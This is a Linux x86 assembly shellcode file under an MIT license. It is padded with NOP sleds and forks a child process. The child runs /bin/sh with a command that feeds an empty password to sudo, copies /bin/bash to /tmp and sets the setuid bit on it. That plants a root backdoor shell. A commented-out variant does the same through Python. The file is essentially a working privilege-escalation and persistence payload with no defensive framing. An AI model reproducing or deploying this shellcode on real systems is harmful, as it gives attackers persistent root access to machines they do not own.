; MIT License - Copyright 2020
; David Reguera Garcia aka Dreg - dreg@fr33project.org
; -
; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
; FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
; IN THE SOFTWARE.

section .text
global  _start
_start:

times 100 db 90h

	mov eax, 2 ; fork
	int 0x80
	cmp eax, 0
	jz child
parent:
        push 0
        push 0
        push 0
        push 0
        push 0
        push 0

        mov ebx, eax
        mov ecx, 0
        mov edx, 0
        mov esi, 0
        mov edi, 0
        mov eax, 114 ; wait4
        int 0x80

        jmp end_sc

child:
        push 0
        call lxz
;        arg2 db  `import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1");`,0
        arg2 db  `/bin/echo | /usr/bin/sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | /usr/bin/sudo -S /usr/bin/chmod +s /tmp/bash >/dev/null 2>&1`,0
lxz:
        call drgs
        db `-c`,0
drgs:
        call zhu
;        msg db `/bin/python`,0
        msg db `/bin/sh`,0
zhu:
        lea ecx, [esp]            ;argv
        mov ebx, [esp]            ;file
        xor edx, edx            ; No Env
        mov eax, 11 ; __NR_execve
        int 0x80

        mov eax, 1 ; exit
        mov ebx, 0
        int 0x80

end_sc:
times 1000 db 90h
